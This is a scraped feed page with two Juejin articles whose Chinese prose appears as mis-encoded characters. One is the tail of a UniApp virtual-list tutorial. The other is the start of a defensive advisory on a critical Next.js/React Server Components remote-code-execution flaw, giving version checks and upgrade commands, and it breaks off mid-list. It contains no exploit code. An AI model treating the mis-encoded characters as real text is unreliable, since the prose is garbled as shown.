li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è™šæ‹Ÿåˆ—è¡¨çš„æ ¸å¿ƒæ€æƒ³</h2>
<p>è™šæ‹Ÿåˆ—è¡¨çš„æ ¸å¿ƒå…¶å®å¾ˆç®€å•ï¼š<strong>åªæ¸²æŸ“ç”¨æˆ·èƒ½çœ‹åˆ°çš„é‚£éƒ¨åˆ†å†…å®¹</strong>ã€‚å½“ç”¨æˆ·æ»šåŠ¨æ—¶ï¼ŒåŠ¨æ€è®¡ç®—å“ªäº›å…ƒç´ åº”è¯¥å‡ºç°åœ¨å¯è§†åŒºåŸŸå†…ï¼Œç„¶ååªæ¸²æŸ“è¿™äº›å…ƒç´ ï¼Œåœ¨å¤§æ•°æ®é‡åˆ—è¡¨ä¸­èƒ½æ˜¾è‘—æå‡æ€§èƒ½ã€‚</p>
<h2 data-id="heading-1">åŸºæœ¬å®ç°æ€è·¯</h2>
<ol>
<li>ç”¨ä¸€ä¸ªå›ºå®šé«˜åº¦çš„å®¹å™¨åŒ…è£¹æ•´ä¸ªåˆ—è¡¨</li>
<li>è®¡ç®—æ€»å†…å®¹é«˜åº¦ï¼ˆç”¨å ä½å…ƒç´ æ’‘å¼€ï¼‰</li>
<li>ç›‘å¬æ»šåŠ¨äº‹ä»¶ï¼Œè®¡ç®—å½“å‰å¯è§†åŒºåŸŸçš„èµ·å§‹ç´¢å¼•</li>
<li>åªæ¸²æŸ“å¯è§†åŒºåŸŸå†…çš„å…ƒç´ ï¼Œå…¶ä»–ç”¨ç©ºç™½å¡«å……</li>
<li>é€šè¿‡ <code>transform</code> æ¥å®šä½å®é™…å†…å®¹</li>
</ol>
<h2 data-id="heading-2">é‡åˆ°çš„å‘</h2>
<h3 data-id="heading-3">1. å ä½ç¬¦å¯¼è‡´çš„å¸ƒå±€é—®é¢˜</h3>
<p>æœ€å¼€å§‹å®ç°æ—¶ï¼Œå ä½ç¬¦å’Œåˆ—è¡¨å®¹å™¨éƒ½åœ¨æ–‡æ¡£æµå†…ï¼Œå¯¼è‡´åˆ—è¡¨å®¹å™¨ç›¸å¯¹å ä½ç¬¦å®šä½è€Œåç¦»äº†ä½ç½®ï¼Œè§£å†³åŠæ³•å°±æ˜¯è®©å ä½ç¬¦è„±ç¦»æ–‡æ¡£æµï¼Œè®¾ä¸ºç»å¯¹å®šä½ï¼Œå¤–å±‚å®¹å™¨ä¿æŒç›¸å¯¹å®šä½ã€‚</p>
<h3 data-id="heading-4">2. æ»šåŠ¨é—ªçƒé—®é¢˜</h3>
<p>åœ¨å¿«é€Ÿæ»šåŠ¨æ—¶ï¼Œæœ‰æ—¶ä¼šå‡ºç°ç©ºç™½é—ªçƒã€‚åŸå› æ˜¯ï¼š</p>
<ul>
<li>é¢„æ¸²æŸ“çš„ç¼“å†²å…ƒç´ æ•°é‡ä¸è¶³</li>
<li>å…ƒç´ å°ºå¯¸æµ‹é‡å»¶è¿Ÿ</li>
</ul>
<p>é€šè¿‡å¢åŠ  <code>buffer</code>å±æ€§å’Œå¼‚æ­¥æµ‹é‡è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> visibleRange = <span class="hljs-built_in">computed</span>(() =&gt; {
  <span class="hljs-comment">// ... è®¡ç®—é€»è¾‘</span>
  <span class="hljs-keyword">return</span> { start, end: Math.<span class="hljs-built_in">min</span>(end + props.buffer, props.list.length) }
})
</code></pre>
<p><code>buffer</code>å…¶å®å°±æ˜¯é¢„åŠ è½½çš„ç¼“å†²åŒºåŸŸï¼Œè®¾ç½®ä¸º3åˆ™ä»£è¡¨å‰åå¤šæ¸²æŸ“3ä¸ªitemï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æ»‘åŠ¨è¿‡å¿«å¯¼è‡´æ¸²æŸ“è·Ÿä¸ä¸Šè€Œç™½å±ã€‚</p>
<h3 data-id="heading-5">3. å…ƒç´ å°ºå¯¸æµ‹é‡ä¸å‡†</h3>
<p>åœ¨ UniApp ä¸­æµ‹é‡å…ƒç´ å°ºå¯¸éœ€è¦ä½¿ç”¨ <code>uni.createSelectorQuery()</code>ï¼Œä½†è¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>å¿…é¡»åœ¨ç»„ä»¶æŒ‚è½½åæ‰èƒ½æµ‹é‡</li>
<li>å¼‚æ­¥æµ‹é‡å¯¼è‡´åˆå§‹æ¸²æŸ“æ—¶ä½¿ç”¨é¢„ä¼°å°ºå¯¸</li>
<li>å…ƒç´ åŠ¨æ€å˜åŒ–æ—¶å°ºå¯¸éœ€è¦é‡æ–°æµ‹é‡</li>
</ul>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">measureItem</span> = (<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> itemIndex = visibleRange.<span class="hljs-property">value</span>.<span class="hljs-property">start</span> + index
  <span class="hljs-keyword">if</span> (measured.<span class="hljs-title function_">has</span>(itemIndex)) <span class="hljs-keyword">return</span>
  
  uni
    .<span class="hljs-title function_">createSelectorQuery</span>()
    .<span class="hljs-title function_">in</span>(instance?.<span class="hljs-property">proxy</span>)
    .<span class="hljs-title function_">select</span>(<span class="hljs-string">`.item-<span class="hljs-subst">${itemIndex}</span>`</span>)
    .<span class="hljs-title function_">boundingClientRect</span>(<span class="hljs-function">(<span class="hljs-params">res: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (res) {
        <span class="hljs-keyword">const</span> size = isVertical.<span class="hljs-property">value</span> ? res.<span class="hljs-property">height</span> : res.<span class="hljs-property">width</span>
        itemSizes.<span class="hljs-property">value</span>[itemIndex] = size
        measured.<span class="hljs-title function_">add</span>(itemIndex)
      }
    })
    .<span class="hljs-title function_">exec</span>()
}
</code></pre>
<p>ç”¨ <code>measured</code>Set è®°å½•å·²ç»æµ‹é‡è¿‡çš„å…ƒç´ ï¼Œé¿å…é‡å¤æµ‹é‡ã€‚</p>
<h3 data-id="heading-6">4. æ»šåŠ¨æ€§èƒ½ä¼˜åŒ–</h3>
<p>ç›´æ¥åœ¨ <code>@scroll</code>äº‹ä»¶ä¸­æ›´æ–°çŠ¶æ€åœ¨å¿«é€Ÿæ»šåŠ¨æ—¶ä¼šæœ‰æ€§èƒ½é—®é¢˜ï¼Œä½† UniApp çš„ <code>scroll-view</code>æœ¬èº«å°±æœ‰èŠ‚æµï¼Œæ‰€ä»¥æ²¡æœ‰é¢å¤–å¤„ç†ã€‚å¦‚æœéœ€è¦æ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œå¯ä»¥è€ƒè™‘ç”¨é˜²æŠ–æˆ–èŠ‚æµåŒ…è£…æ»šåŠ¨å¤„ç†å‡½æ•°ã€‚</p>
<h3 data-id="heading-7">5. æ•°æ®æ›´æ–°å¤„ç†</h3>
<p>å½“åˆ—è¡¨æ•°æ®å˜åŒ–æ—¶ï¼Œä¹‹å‰æµ‹é‡çš„å°ºå¯¸å°±å¤±æ•ˆäº†ã€‚æˆ‘é€šè¿‡ watch ç›‘å¬æ•°æ®å˜åŒ–æ¥é‡ç½®ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">watch</span>(
  () =&gt; props<span class="hljs-selector-class">.list</span>,
  () =&gt; {
    itemSizes<span class="hljs-selector-class">.value</span> = <span class="hljs-selector-attr">[]</span>
    measured<span class="hljs-selector-class">.clear</span>()
  },
  { deep: true }
)
</code></pre>
<h3 data-id="heading-8">6. æ°´å¹³æ»šåŠ¨çš„é€‚é…</h3>
<p>ä¸ºäº†è®©ç»„ä»¶åŒæ—¶æ”¯æŒå‚ç›´å’Œæ°´å¹³æ»šåŠ¨ï¼Œéœ€è¦åŠ ä¸€ç‚¹æ¡ä»¶åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> isVertical = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> props.<span class="hljs-property">direction</span> === <span class="hljs-string">'vertical'</span>
})

<span class="hljs-comment">// åœ¨æ ·å¼ä¸­</span>
<span class="hljs-attr">transform</span>: isVertical.<span class="hljs-property">value</span>
  ? <span class="hljs-string">`translateY(<span class="hljs-subst">${startOffset.value}</span>px)`</span>
  : <span class="hljs-string">`translateX(<span class="hljs-subst">${startOffset.value}</span>px)`</span>
</code></pre>
<h2 data-id="heading-9">ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-ini" lang="ini">&lt;yt-virtual-list
  :<span class="hljs-attr">list</span>=<span class="hljs-string">"data"</span>
  <span class="hljs-attr">direction</span>=<span class="hljs-string">"vertical"</span>
  <span class="hljs-attr">height</span>=<span class="hljs-string">"200px"</span>
  :<span class="hljs-attr">buffer</span>=<span class="hljs-string">"3"</span>
  :<span class="hljs-attr">estimatedSize</span>=<span class="hljs-string">"40"</span>
&gt;
  &lt;template <span class="hljs-comment">#list-item="{ item, index }"&gt;</span>
    &lt;view <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span>&gt;
      &lt;text&gt;{{ index }}. {{ item.name }}&lt;/text&gt;
    &lt;/view&gt;
  &lt;/template&gt;
&lt;/yt-virtual-list&gt;
</code></pre>
<h2 data-id="heading-10">æ€»ç»“</h2>
<p>æ‰‹æ“è™šæ‹Ÿåˆ—è¡¨æœ€å¤§çš„æ”¶è·æ˜¯ç†è§£äº†è™šæ‹Ÿæ»šåŠ¨çš„åŸç†ã€‚è™½ç„¶æœ‰ä¸€äº›å‘ï¼Œä½†è§£å†³äº†ä¹‹åçš„æ•ˆæœè¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨ç§»åŠ¨ç«¯å¤„ç†é•¿åˆ—è¡¨æ—¶ï¼Œæ€§èƒ½æå‡éå¸¸æ˜¾è‘—ã€‚ å…³é”®ç‚¹ï¼š</p>
<ul>
<li>æ­£ç¡®è®¡ç®—å’Œæ›´æ–°å…ƒç´ ä½ç½®</li>
<li>åˆç†çš„ç¼“å†²æœºåˆ¶é˜²æ­¢ç©ºç™½</li>
<li>å‡†ç¡®çš„å°ºå¯¸æµ‹é‡</li>
<li>å¤„ç†å¥½æ•°æ®å˜åŒ–æ—¶çš„çŠ¶æ€é‡ç½®</li>
</ul>
<p>è™šæ‹Ÿåˆ—è¡¨åœ¨ç§»åŠ¨ç«¯å¼€å‘ä¸­æ˜¯ä¸ªå¾ˆå®ç”¨çš„ä¼˜åŒ–æ‰‹æ®µï¼Œå€¼å¾—èŠ±æ—¶é—´ç†è§£å’Œå®ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç´§æ€¥æ’æ’­ï¼šCVSS 10.0 æ»¡åˆ†æ¼æ´ï¼ä½ çš„ Next.js é¡¹ç›®å¯èƒ½æ­£åœ¨è£¸å¥”]]></title>    <link>https://juejin.cn/post/7580372534043689003</link>    <guid>https://juejin.cn/post/7580372534043689003</guid>    <pubDate>2025-12-07T14:40:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580372534043689003" data-draft-id="7580389111921426495" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç´§æ€¥æ’æ’­ï¼šCVSS 10.0 æ»¡åˆ†æ¼æ´ï¼ä½ çš„ Next.js é¡¹ç›®å¯èƒ½æ­£åœ¨è£¸å¥”"/> <meta itemprop="keywords" content="å‰ç«¯,Next.js"/> <meta itemprop="datePublished" content="2025-12-07T14:40:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Duckä¸å¿…"/> <meta itemprop="url" content="https://juejin.cn/user/2291826942022296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç´§æ€¥æ’æ’­ï¼šCVSS 10.0 æ»¡åˆ†æ¼æ´ï¼ä½ çš„ Next.js é¡¹ç›®å¯èƒ½æ­£åœ¨è£¸å¥”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2291826942022296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Duckä¸å¿…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-07T14:40:39.000Z" title="Sun Dec 07 2025 14:40:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš¨ ç´§æ€¥æ’æ’­ï¼šCVSS 10.0 æ»¡åˆ†æ¼æ´ï¼ä½ çš„ Next.js é¡¹ç›®å¯èƒ½æ­£åœ¨è£¸å¥”ï¼ˆå«ä¿å§†çº§ä¿®å¤æŒ‡å—ï¼‰</h2>
<blockquote>
<p><strong>âš ï¸ é«˜èƒ½é¢„è­¦</strong>ï¼šè¿™ä¸æ˜¯æ¼”ä¹ ï¼è¿™ä¸æ˜¯æ¼”ä¹ ï¼</p>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ [ä½ çš„åå­—]ã€‚ä»Šå¤©ä¸èŠæ¶æ„ï¼Œä¸èŠæºç ï¼Œå’±ä»¬æ¥èŠèŠä¿å‘½çš„äº‹å„¿ã€‚</p>
<p>å°±åœ¨ 2025 å¹´ 12 æœˆåˆï¼Œå®‰å…¨åœˆç‚¸é”…äº†ã€‚React å’Œ Next.js ç”Ÿæ€çˆ†å‡ºäº†ä¸€ä¸ªæ ¸å¼¹çº§æ¼æ´ï¼ˆCVE-2025-66478 &amp; CVE-2025-55182ï¼‰ï¼ŒCVSS è¯„åˆ†ç›´æ¥æ‹‰æ»¡åˆ°äº† <strong>10.0</strong>ã€‚ä»€ä¹ˆæ¦‚å¿µï¼Ÿè¿™æ„å‘³ç€æ”»å‡»è€…<strong>ä¸éœ€è¦ç™»å½•ã€ä¸éœ€è¦å¤æ‚çš„æƒé™</strong>ï¼ŒåŠ¨åŠ¨æ‰‹æŒ‡å‘ä¸ª HTTP è¯·æ±‚ï¼Œå°±èƒ½åœ¨ä½ æœåŠ¡å™¨ä¸Š<strong>æ‰§è¡Œä»»æ„ä»£ç  (RCE)</strong>ã€‚</p>
<p>å…„å¼Ÿä»¬ï¼Œèµ¶ç´§æ”¾ä¸‹æ‰‹é‡Œçš„å’–å•¡ï¼Œè·Ÿæˆ‘ä¸€èµ·æ£€æŸ¥ä¸‹ä½ çš„çº¿ä¸ŠæœåŠ¡å§ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">1. å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</h3>
<p>ç®€å•è¯´ï¼Œå°±æ˜¯ React Server Components (RSC) çš„é€šä¿¡åè®®ï¼ˆFlight åè®®ï¼‰é‡Œï¼Œå‡ºäº†ä¸€ä¸ªååºåˆ—åŒ–çš„ Bugã€‚</p>
<ul>
<li><strong>æ¼æ´ç¼–å·</strong>ï¼šCVE-2025-66478 (Next.js) / CVE-2025-55182 (React)</li>
<li><strong>å±é™©ç­‰çº§</strong>ï¼šğŸ”¥ <strong>Critical (RCE)</strong></li>
<li><strong>è°åœ¨å°„ç¨‹å†…</strong>ï¼š
<ul>
<li>åªè¦ä½ ç”¨äº† <strong>App Router</strong>ã€‚</li>
<li>æˆ–è€…ä½ ç”¨äº† <strong>React Server Components</strong>ã€‚</li>
<li>ç‰¹åˆ«æ˜¯ <strong>Next.js 15.x / 16.x</strong> çš„æ—©æœŸç‰ˆæœ¬ï¼Œä»¥åŠ <strong>Next.js 14.x</strong> çš„éƒ¨åˆ† Canary ç‰ˆæœ¬ã€‚</li>
<li><strong>åˆ’é‡ç‚¹</strong>ï¼šé»˜è®¤é…ç½®ä¸‹çš„ <code>create-next-app</code> é¡¹ç›®å¦‚æœæ˜¯ä¸Šè¿°ç‰ˆæœ¬ï¼Œç›´æ¥ä¸­æ‹›ã€‚</li>
</ul>
</li>
</ul>
<p>å¦‚æœä¸ä¿®ï¼Œé»‘å®¢ä¸ä»…èƒ½çœ‹ä½ çš„ç¯å¢ƒå˜é‡ï¼ˆæ•°æ®åº“å¯†ç ã€API Keyï¼‰ï¼Œç”šè‡³èƒ½ç›´æ¥æ¥ç®¡ä½ çš„æœåŠ¡å™¨æŒ–çŸ¿ã€‚ğŸ˜±</p>
<hr/>
<h3 data-id="heading-2">2. èµ¶ç´§è‡ªæŸ¥ï¼(æ‰‹æŠŠæ‰‹æ•™ä½ )</h3>
<p>åˆ«æ…Œï¼Œå…ˆç¡®è®¤ä¸‹è‡ªå·±æ˜¯ä¸æ˜¯â€œå¤©é€‰ä¹‹å­â€ã€‚è¿ä¸Šä½ çš„æœåŠ¡å™¨ï¼Œæˆ–è€…åœ¨æœ¬åœ°é¡¹ç›®é‡Œè·‘ä¸€ä¸‹ï¼š</p>
<h4 data-id="heading-3">ç¬¬ä¸€æ­¥ï¼šçœ‹ä¸€çœ¼ <code>package.json</code></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># çœ‹çœ‹ä½ æ˜¾å¼å®‰è£…çš„ç‰ˆæœ¬</span>
<span class="hljs-built_in">cat</span> package.json | grep next
</code></pre>
<h4 data-id="heading-4">ç¬¬äºŒæ­¥ï¼šçœ‹ä¸€çœ¼å®é™…å®‰è£…ç‰ˆæœ¬ï¼ˆè¿™æ­¥å¾ˆå…³é”®ï¼ï¼‰</h4>
<p>æœ‰æ—¶å€™ <code>package.json</code> é‡Œå†™çš„æ˜¯ <code>^15.0.0</code>ï¼Œä½†å®é™… <code>node_modules</code> é‡Œè·‘çš„å¯èƒ½æ˜¯ä¸ªæœ‰æ¼æ´çš„å°ç‰ˆæœ¬ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥æŸ¥æˆ·å£æœ¬</span>
npm list next
<span class="hljs-comment"># æˆ–è€… yarn å…š</span>
yarn list next
</code></pre>
<h4 data-id="heading-5">ğŸš¨ æ­»äº¡åå•</h4>
<p>å¦‚æœä½ çœ‹åˆ°ç‰ˆæœ¬å·è½åœ¨ä¸‹é¢è¿™äº›åŒºé—´ï¼Œè¯·ç«‹å³å¼€å¯â€œä¸€çº§æˆ˜å¤‡â€çŠ¶æ€ï¼š</p>
<ul>
<li>âŒ <strong>Next.js 15.x</strong> å…¨ç³»ï¼ˆæœªæ‰“è¡¥ä¸å‰ï¼‰</li>
<li>âŒ <strong>Next.js 16.x</strong> é¢„è§ˆç‰ˆï¼ˆæœªæ‰“è¡¥ä¸å‰ï¼‰</li>
<li>âŒ <strong>Next.js 14.x</strong> çš„ Canary ç‰ˆæœ¬ï¼ˆå°¤å…¶æ˜¯ <code>&gt;= 14.3.0-canary.77</code>ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-6">3. æ€ä¹ˆæ•‘ï¼Ÿ(Ctrl+C, Ctrl+V å°±èƒ½ç”¨)</h3>
<p>å®˜æ–¹å“åº”å¾ˆå¿«ï¼Œè¡¥ä¸å·²ç»å‘äº†ã€‚<strong>å‡çº§æ˜¯å”¯ä¸€é è°±çš„æ–¹æ¡ˆ</strong>ï¼Œåˆ«æ•´é‚£äº›èŠ±é‡Œèƒ¡å“¨çš„ WAF è§„åˆ™ï¼Œå®¹æ˜“è¢«ç»•è¿‡ã€‚</p>
<h4 data-id="heading-7">æ–¹æ¡ˆ Aï¼šæˆ‘æ˜¯ç¨³å®šå…š (æ¨è) ğŸš€</h4>
<p>å¦‚æœä½ çš„é¡¹ç›®æ²¡ä»€ä¹ˆé­”æ”¹ä¾èµ–ï¼Œç›´æ¥å‡åˆ°æœ€æ–°çš„ç¨³å®šç‰ˆ Patchã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm å…š</span>
npm install next@latest react@latest react-dom@latest

<span class="hljs-comment"># yarn å…š</span>
yarn add next@latest react@latest react-dom@latest

<span class="hljs-comment"># pnpm å…š (yyds)</span>
pnpm add next@latest react@latest react-dom@latest
</code></pre>
<h4 data-id="heading-8">æ–¹æ¡ˆ Bï¼šæˆ‘æ˜¯æ¿€è¿›å…š/Canary ä¾èµ–è€… ğŸ§ª</h4>
<p>æœ‰äº›å…„å¼Ÿä¸ºäº†å°é²œæˆ–è€…æŸäº›ç‰¹æ€§é”æ­»äº† Canary ç‰ˆæœ¬ï¼Œé‚£ä½ å¾—å‡åˆ°ä¿®å¤åçš„ Canaryï¼ˆæ¯”å¦‚ <code>15.6.0-canary.58</code> æˆ–æ›´æ–°ï¼‰ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">npm install next@canary
</code></pre>
<h4 data-id="heading-9">âš ï¸ åˆ«å¿˜äº†æœ€åä¸€æ­¥ï¼</h4>
<p>å‡çº§å®Œä¾èµ–ï¼Œä»£ç åªæ˜¯åœ¨ç¡¬ç›˜ä¸Šå˜äº†ï¼Œå†…å­˜é‡Œè·‘çš„è¿˜æ˜¯æ—§çš„ã€‚<strong>ä¸€å®šè¦é‡å¯æœåŠ¡ï¼ä¸€å®šè¦é‡å¯æœåŠ¡ï¼ä¸€å®šè¦é‡å¯æœåŠ¡ï¼</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># PM2 ç”¨æˆ·</span>
pm2 reload all

<span class="hljs-comment"># Docker ç”¨æˆ·</span>
docker-compose up -d --build
</code></pre>
<hr/>
<h3 data-id="heading-10">4. å®åœ¨å‡ä¸åŠ¨æ€ä¹ˆåŠï¼Ÿ(æ•‘æ€¥ç”¨)</h3>
<p>â€œå¤§ä½¬ï¼Œæˆ‘é¡¹ç›®å¤ªè€/ä¾èµ–å†²çªï¼Œå‡äº†å°±å´©å•Šï¼â€</p>
<p>ç†è§£ç†è§£ï¼Œä¸šåŠ¡ç”±äºæŸäº›ä¸å¯æŠ—åŠ›æš‚æ—¶åŠ¨ä¸äº†ã€‚è¿™æ—¶å€™åªèƒ½æ­»é©¬å½“æ´»é©¬åŒ»äº†ï¼š</p>
<ol>
